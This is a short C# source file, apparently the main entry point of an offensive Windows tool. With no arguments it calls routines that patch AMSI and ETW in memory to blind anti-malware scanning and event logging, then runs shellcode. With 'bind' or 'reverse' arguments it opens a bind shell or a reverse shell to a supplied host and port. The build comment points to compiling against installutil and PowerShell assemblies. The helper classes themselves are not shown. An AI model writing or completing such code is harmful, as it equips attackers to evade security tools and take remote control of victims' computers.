// mcs main.cs patcher.cs utility.cs runner.cs installutil.cs /reference:System.Management.Automation.dll /reference:System.Configuration.Install.dll

using System;

public static class main
{
    public static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            MemoryPatcher.PatchAMSI();
            MemoryPatcher.PatchETW();
            ShellcodeRunner.RunShellcode();
        }
        else
        {
            if (args[0] == "bind")
                Uninstaller.ExecuteBindShell();
            else if (args[0] == "reverse")
                Uninstaller.ExecuteReverseShell(args[1], args[2]);
        }
    }
}

